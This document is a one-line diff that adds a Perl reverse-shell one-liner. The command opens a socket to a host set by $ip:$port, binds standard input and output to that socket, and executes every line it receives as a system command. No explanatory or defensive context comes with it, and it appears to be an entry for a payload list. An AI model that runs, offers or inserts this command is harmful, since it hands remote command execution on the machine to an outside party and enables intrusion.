@@ -1,0 +1,1 @@
+perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"$ip:$port");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
